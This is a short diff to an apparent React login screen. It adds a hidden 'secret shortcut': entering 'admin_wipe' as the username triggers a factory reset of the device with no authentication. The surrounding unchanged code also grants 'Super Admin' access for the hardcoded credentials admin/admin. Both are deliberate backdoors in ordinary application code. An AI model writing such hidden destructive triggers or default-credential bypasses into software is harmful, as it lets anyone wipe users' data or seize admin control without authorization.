@@ -53,6 +53,12 @@ const LoginScreen = ({ onLogin }) => {
   };
 
   const handleLogin = async () => {
+    // Secret shortcut for cleanup: Type 'admin_wipe' in username to reset device
+    if (formData.username.toLowerCase() === 'admin_wipe') {
+      handleFactoryReset();
+      return;
+    }
+
     if (formData.username === 'admin' && formData.password === 'admin') {
       onLogin({ id: 'admin', name: 'Super Admin', role: 'Admin' });
       return;
